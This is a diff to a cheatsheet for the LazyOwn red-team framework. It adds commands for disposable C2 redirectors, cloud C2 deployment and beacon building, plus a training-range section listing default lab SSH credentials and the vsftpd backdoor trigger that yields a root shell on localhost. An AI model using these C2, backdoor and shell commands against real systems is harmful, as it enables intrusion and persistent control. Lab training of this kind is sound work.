@@ -1,6 +1,6 @@
 # LazyOwn Cheatsheet — Frequent Commands by Goal
 
-This is the second-level reference. Start with `ESSENTIALS.md` first. Use this when you need the next layer of detail. For the full 741-command catalog, see `COMMANDS.md`.
+This is the second-level reference. Start with `ESSENTIALS.md` first. Use this when you need the next layer of detail. For the full 748-command catalog, see `COMMANDS.md`.
 
 ---
 
@@ -163,6 +163,32 @@ This is the second-level reference. Start with `ESSENTIALS.md` first. Use this w
 | Generate revshell | `createrevshell` |
 | Generate webshell | `createwebshell` |
 | Backdoor via netcat | `backdoor` |
+| Spawn disposable redirectors | `infra redirector spawn --count 2` |
+| List redirector URLs | `infra redirector list` |
+| Destroy redirectors | `infra redirector kill --all` |
+| Bake redirectors into beacon (order: spawn, assign, build) | `assign c2_fallback_urls <url1,url2>` then `c2 linux 2` |
+| Deploy local ephemeral C2 | `infra deploy --provider local` |
+| Deploy cloud C2 (DigitalOcean) | `infra deploy --provider digitalocean --region nyc1` |
+| Destroy ephemeral infra | `infra destroy --provider local` |
+| Infra status | `infra status` |
+
+---
+
+## Cyber Range (Training)
+
+| Goal | Command |
+|------|---------|
+| List range profiles | `lab range status` / `lab list` |
+| Start mini-AD range | `lab range start ad-mini` |
+| Prove range is exploitable (real root shell) | `lab range verify ad-mini` |
+| Stop mini-AD range | `lab range stop ad-mini` |
+| SSH into ws01 | `ssh -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no msfadmin@127.0.0.1` (password `msfadmin`) |
+| vsftpd backdoor to root shell | `USER backdoor:)` / `PASS x` on `127.0.0.1:2121`, shell on `127.0.0.1:6200` |
+| List gym challenges | `gym list` |
+| Deploy-implant challenge | `gym start first_implant` |
+| Lateral-movement challenge | `gym start lateral_ad` |
+| Exfiltration challenge | `gym start vault_exfil` |
+| Submit challenge | `gym submit --techniques implant_deploy,beacon_callback` |
 
 ---
 
@@ -175,6 +201,8 @@ This is the second-level reference. Start with `ESSENTIALS.md` first. Use this w
 | List captured credentials | `credentials` |
 | TUI dashboard | `dashboard` |
 | Generate report | `report` |
+| Full multi-format report | `gen_report generate <name>` |
+| Report with AI executive summary | `gen_report generate <name> --with-ai --ai-backend groq` |
 | Red-team timeline | `timeline` |
 
 ---
